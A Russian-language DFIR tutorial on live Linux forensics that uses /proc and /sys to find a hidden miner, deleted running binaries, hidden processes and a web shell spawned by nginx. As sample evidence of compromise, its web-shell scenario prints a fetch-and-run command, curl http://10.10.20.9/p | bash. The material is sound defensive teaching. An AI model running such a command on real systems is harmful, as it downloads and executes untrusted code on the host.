## Вопрос, с которого всё начинается

Ты подключился к подозрительному Linux-серверу. Диск можно скопировать и разбирать потом,
но **память и состояние процессов исчезнут при выключении**. Как снять самое важное —
прямо сейчас, аккуратно и не потревожив злоумышленника?

Ответ — виртуальные файловые системы **`/proc`** и **`/sys`**. Разберём сквозной пример:
на живой системе найдём подозрительный процесс и его сетевые соединения.

## Что такое /proc и /sys

**`/proc`** — это «окно» в ядро. Это не настоящие файлы на диске, а интерфейс: читая
файл, ты спрашиваешь ядро о состоянии. Каждому процессу соответствует каталог с его
**PID**:

- `/proc/<pid>/cmdline` — командная строка (аргументы через нулевой байт).
- `/proc/<pid>/environ` — переменные окружения процесса.
- `/proc/<pid>/cwd` — символическая ссылка на текущий каталог.
- `/proc/<pid>/exe` — ссылка на исполняемый файл (даже если он удалён!).
- `/proc/<pid>/fd/` — открытые дескрипторы (файлы, сокеты, каналы).
- `/proc/<pid>/maps` — карта памяти (какие библиотеки и файлы замаплены).

**`/sys`** — аналогичное окно в подсистемы (устройства, модули ядра, шина). Для форензики
особенно интересны `/sys/module` (загруженные модули) и `/sys/kernel`.

Ключевая ценность `/proc`: **его нельзя «почистить»** — удаление файла на диске не убирает
информацию из `/proc`, пока процесс жив.

## Наш пример: подозрительный процесс

Допустим, есть сервер, и мы хотим найти майнер. Начинаем с общего списка процессов:

```
$ ps aux --sort=-%cpu | head
USER   PID  %CPU %MEM COMMAND
root  1337  98.7  1.2 /tmp/.x/kworkerd --pool pool.example:3333
www    812   0.0  0.3 nginx: worker process
```

Процесс `1337` грузит CPU под завязку и запущен из `/tmp/.x/` — скрытый каталог. Смотрим
его командную строку «правильно»:

```
$ tr '\0' ' ' < /proc/1337/cmdline
/tmp/.x/kworkerd --pool pool.example:3333
```

Аргументы в `/proc/<pid>/cmdline` разделены **нулевыми байтами**, поэтому `cat` покажет
слипшуюся строку. Приём `tr '\0' ' '` превращает нули в пробелы и делает строку читаемой.
Это первый важный технический навык живого анализа.

### Открытые файлы и удалённый бинарник

Смотрим, какие файлы открыты:

```
$ ls -l /proc/1337/fd
lrwx------ 1 root root 64 ... 0 -> /dev/null
lrwx------ 1 root root 64 ... 3 -> /tmp/.x/pool.log
lrwx------ 1 root root 64 ... 5 -> socket:[41234]
```

И проверяем ссылку на исполняемый файл:

```
$ ls -l /proc/1337/exe
lrwxrwxrwx 1 root root 0 ... /proc/1337/exe -> /tmp/.x/kworkerd (deleted)
```

Слово **`(deleted)`** — важнейшая улика. Бинарник удалён с диска, но **всё ещё работает**,
и через `/proc/1337/exe` его можно скопировать на анализ. Это классический приём малвари:
удалить себя после запуска, чтобы не остаться на диске. Живой анализ ловит её.

### Переменные окружения и рабочий каталог

```
$ tr '\0' '\n' < /proc/1337/environ | grep -iE 'ssh|proxy|token'
LD_PRELOAD=/tmp/.x/libhook.so
```

Переменная `LD_PRELOAD` с библиотекой из `tmp` — признак перехвата вызовов. А рабочий
каталог:

```
$ ls -l /proc/1337/cwd
... /proc/1337/cwd -> /tmp/.x
```

Всё сходится: процесс живёт в скрытом каталоге, перехватывает библиотеки и держит
соединение.

## Сетевые соединения без внешних утилит

Даже если `ss`/`netstat` на хосте нет или подменены, соединения видны через `/proc`.
Читаем таблицы ядра:

```
$ cat /proc/net/tcp | head
  sl  local_address rem_address   st ...
   0: 0100007F:1F90 00000000:0000 0A ...
   1: 0A0A1409:9C40 0A0A1409:0D05 01 ...
```

Адреса здесь в **hex в порядке little-endian**. `0100007F` — это `127.0.0.1`, а порт
`1F90` — `8080`. Так можно найти listening-порты и активные соединения, не доверяя
утилитам, которые злоумышленник мог подменить. Расшифровка вручную кропотлива, но именно
поэтому это «доверенный» источник.

## Что искать в /sys

`/sys/module` перечисляет загруженные модули ядра:

```
$ ls /sys/module | grep -iE 'hook|root|hide'
```

Необычный модуль (например, что-то похожее на руткит) — повод копнуть. Также смотрим
`/proc/modules` и сверяем с `/sys/module`: расхождение может указывать на сокрытие.

## Порядок сбора волатильных данных

Живой анализ нужно проводить **по порядку волатильности**: сначала то, что исчезнет
быстрее всего, потом то, что живёт дольше. Классический порядок такой:

1. **Состояние памяти и процессы** — список PID, командные строки, карты памяти.
2. **Сетевые соединения** — `ss`, `/proc/net/*`, таблицы ARP.
3. **Открытые файлы** — `lsof`, дескрипторы в `/proc/*/fd`.
4. **Загруженные модули** — `/proc/modules`, `/sys/module`.
5. **Временные метки и логи** — они переживут перезагрузку, поэтому позже.

Ошибка новичка — начать с копирования диска. Диск никуда не денется, а работающий
вредоносный процесс может «уйти» при первом же подозрении. Поэтому память и процессы —
первыми.

## Приёмы против сокрытия процессов

Злоумышленник может подменить `ps`, `top`, `ls`, `ss`, спрятав свои процессы и файлы.
Поэтому в живом анализе есть «доверенные» пути в обход утилит:

- читать каталоги `/proc` напрямую (`ls /proc` покажет PID даже скрытого процесса);
- сверять вывод `ps` со списком каталогов `/proc/<pid>`;
- читать таблицы ядра из `/proc/net/` вместо `netstat`;
- использовать статически скомпилированные утилиты со съёмного носителя.

Если `ps` показывает 120 процессов, а `ls /proc` — 121 каталогов с числовыми именами,
один процесс скрыт. Это простой, но действенный детект.

## Восстановление удалённых файлов через /proc

Если процесс держит открытым удалённый файл, его содержимое можно скопировать:

```
$ cp /proc/1337/fd/3 /evidence/restored.log
$ cat /proc/1337/maps | grep deleted
```

Первая команда восстанавливает открытый (но удалённый) файл по дескриптору. Вторая
показывает удалённые файлы, замапленные в память процесса — например, подгруженные
библиотеки. Так можно достать и конфиг, и дополнительный модуль малвари.

## Анализ родительских процессов

Полезно смотреть, кто **породил** процесс. В `/proc/<pid>/stat` есть поле PPID, а в
`/proc/<pid>/status` — строка `PPid:`. Строя цепочку «родитель → потомок», можно найти
источник: например, веб-сервер (`nginx`/`apache`) породил `bash`, что означает
веб-шелл. Такой «аномальный родитель» — сильный индикатор компрометации.

```
$ grep -E '^(Name|PPid)' /proc/1337/status
Name: kworkerd
PPid: 1
```

Если PPid равен 1 (init), процесс «осиротел» и живёт сам по себе — характерно для
демонизированной малвари.

## Итоговая методика

Полный порядок: зафиксировать список PID (включая скрытые), снять командные строки и
окружение, собрать сетевые соединения, открытые файлы и карты памяти, скопировать
удалённые бинарники и модули, только потом переходить к диску. Результат — снимок
состояния, который невозможно получить после выключения. Именно поэтому в DFIR говорят:
**«сначала память, потом диск»**.

## Практический сценарий: находим скрытый процесс веб-шелла

Закрепим материал ещё одним сквозным примером. На сервере с `nginx` замечена странная
активность: периодические исходящие соединения на внешний адрес. Начинаем с дерева
процессов и ищем аномального родителя.

Смотрим, какие процессы породил `nginx`. В норме `nginx` не запускает командные оболочки.
Если мы видим, что от `nginx` произошёл `bash` или `sh`, это почти наверняка веб-шелл:

```
$ ps -eo pid,ppid,user,cmd | grep -E 'nginx|bash'
 812   1 www-data nginx: worker process
1401 812 www-data sh -c 'curl http://10.10.20.9/p | bash'
```

Процесс `1401` с родителем `812` (`nginx`) выполняет загрузку и запуск скрипта из сети —
классический признак компрометации веб-приложения. Дальше выясняем, куда смотрит этот
процесс:

```
$ ls -l /proc/1401/cwd
... /proc/1401/cwd -> /var/www/html/uploads
$ ls -l /proc/1401/fd | grep -i socket
... 5 -> socket:[55120]
```

Рабочий каталог — каталог загрузок веб-приложения, значит, шелл был загружен через
уязвимость загрузки файлов. Смотрим сетевые соединения этого процесса в `/proc/net/tcp`
и сопоставляем с адресом из командной строки — они совпадают.

Наконец, проверяем, не оставил ли шелл файл на диске. Даже если он работает «в памяти»
через `curl | bash`, в каталоге `uploads` остаётся исходный загруженный файл. Сопоставляя
время его создания с журналами `nginx` (access log), мы восстанавливаем точный момент
загрузки и, возможно, IP атакующего.

Итог: из четырёх источников — дерева процессов, рабочего каталога, дескрипторов и сетевой
таблицы — мы собрали полную картину. Ключевой навык — замечать **аномального родителя** и
уметь читать состояние процесса напрямую из `/proc`, не полагаясь на утилиты, которые
злоумышленник мог подменить. Это ядро живого анализа Linux и основа для последующего
разбора диска и журналов.

## Что мы теперь знаем

- **`/proc` и `/sys`** — «живое» состояние ядра; их нельзя почистить удалением файлов.
- `/proc/<pid>/cmdline` хранит аргументы через **нулевые байты** — нужен `tr '\0' ' '`.
- Ссылка `/proc/<pid>/exe` с пометкой **`(deleted)`** позволяет восстановить удалённый
  работающий бинарник.
- `/proc/<pid>/environ`, `cwd`, `fd`, `maps` дают окружение, каталог, открытые файлы и
  карту памяти.
- Сетевые соединения видны в `/proc/net/tcp` (hex, little-endian) — доверенный источник.
- `/sys/module` и `/proc/modules` помогают искать подозрительные модули ядра.

## Куда дальше

Мы сняли состояние живой системы. Дальше разберём **SSH-артефакты**: `known_hosts`,
`authorized_keys` и журналы входов. А пока главное запомни: **`/proc` — доверенный источник,
который нельзя почистить, и именно в нём живут удалённые, но работающие бинарники**.

## Где пригодится

- **CTF Forensics:** задачи с живой Linux-системой и скрытым процессом.
- **DFIR:** снятие волатильных данных до выключения.
- **Threat Hunting:** поиск майнеров, руткитов и скрытых процессов.
- **Работа:** реагирование на инциденты на Linux-серверах.
